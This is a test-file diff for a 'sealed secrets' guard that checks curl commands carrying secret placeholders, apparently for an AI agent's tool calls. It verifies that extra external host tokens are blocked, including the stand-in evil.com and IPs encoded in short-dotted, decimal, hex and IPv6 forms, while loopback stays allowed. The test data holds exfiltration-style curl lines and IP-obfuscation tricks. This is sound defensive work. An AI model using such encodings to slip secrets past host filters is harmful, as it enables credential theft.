@@ -284,9 +284,27 @@ const reset = () => { clearSealed(); clearSecrets(); };
   ok(!checkSink("LJ5", "curl http://localhost:3000 -d @x 1.2.3.4", "strict").allowed, "BARE-HOST: IPv4 esterno bare → bloccato");
   // hasForeignHostToken unit: domini-TLD/IPv4 esterni riconosciuti; loopback/no-TLD/decimali NON falso-positivo
   ok(hasForeignHostToken("x evil.com") && hasForeignHostToken("x 1.2.3.4") && hasForeignHostToken("a.b.example.org"), "FOREIGN: domini-TLD + IPv4 esterni riconosciuti");
-  ok(!hasForeignHostToken("curl http://localhost:3000/api/renew?a=1&b=2") && !hasForeignHostToken("127.0.0.1") && !hasForeignHostToken('-d {"price":1.5}'), "FOREIGN: loopback/no-TLD/decimali NON falso-positivo");
+  ok(!hasForeignHostToken("curl http://localhost:3000/api/renew?a=1&b=2") && !hasForeignHostToken("127.0.0.1") && !hasForeignHostToken("-d '{\"price\":1.5}'"), "FOREIGN: loopback/no-TLD/body-quotato NON falso-positivo");
   // legit PULITO verso loopback resta consentito (no falso-block dopo il fix)
   ok(checkSink("LJ5", "curl http://localhost:3000/api/renew?a=1&b=2 -H 'Authorization: Bearer {{secret:LJ5}}'", "strict").allowed, "BARE-HOST: legit pulito loopback ancora consentito (no regressione)");
+
+  // P0 iter-3 (review-loop #3 + security-review): codifiche IP che curl espande a host ESTERNO → BLOCCATE via new URL
+  ok(!checkSink("LJ5", "curl http://localhost:3000 8.8", "strict").allowed, "IP-ENC: dotted-corto 8.8 → 8.0.0.8 esterno → bloccato");
+  ok(!checkSink("LJ5", "curl http://localhost:3000 1.2.3", "strict").allowed, "IP-ENC: 1.2.3 → 1.2.0.3 esterno → bloccato");
+  ok(!checkSink("LJ5", "curl http://localhost:3000 3627734791", "strict").allowed, "IP-ENC: decimale grande → esterno → bloccato");
+  ok(!checkSink("LJ5", "curl http://localhost:3000 0xCB007107", "strict").allowed, "IP-ENC: hex → esterno → bloccato");
+  ok(!checkSink("LJ5", "curl http://localhost:3000 [2001:db8::1]", "strict").allowed, "IP-ENC: IPv6 esterno fra [] → bloccato");
+  // codifiche che curl risolve a LOOPBACK → NON bloccate (corretto: è loopback, non breach)
+  ok(checkSink("LJ5", "curl http://localhost:3000 2130706433", "strict").allowed, "IP-ENC: decimale 2130706433 → 127.0.0.1 loopback → consentito");
+  ok(checkSink("LJ5", "curl http://localhost:3000 [::1]", "strict").allowed, "IP-ENC: [::1] loopback → consentito");
+  // NO falso-blocco: flag-value numerico piccolo + dominio dentro un body QUOTATO
+  ok(checkSink("LJ5", "curl http://localhost:3000/x --max-time 30 -H 'Authorization: Bearer {{secret:LJ5}}'", "strict").allowed, "NO-FP: --max-time 30 (flag-value piccolo) non blocca");
+  ok(checkSink("LJ5", "curl http://localhost:3000/api/renew -d '{\"renew\":true}' -H 'Authorization: Bearer {{secret:LJ5}}'", "strict").allowed, "NO-FP: caso reale utente (body JSON semplice, no URL) non blocca");
+  // NB residuo noto (ergonomico, fail-safe): un URL DENTRO un body (es. webhook config) è visto da extractHosts/urlCount
+  // → bloccato. Non è un buco (errore in sicurezza); il modello usi https o semplifichi. Documentato in concept §4bis.
+  // new URL espansione curl-accurate verificata a livello di hasForeignHostToken
+  ok(hasForeignHostToken("x 8.8") && hasForeignHostToken("x 0xCB007107") && hasForeignHostToken("x [2001:db8::1]") && !hasForeignHostToken("x 2130706433") && !hasForeignHostToken("--max-time 30"),
+     "FOREIGN: new URL normalizza come curl (8.8/hex/IPv6 esterni bloccati; 2130706433/30 no-FP)");
 }
 
 console.log(`\nsealed-secrets test: ${passed} passed, ${failed} failed`);
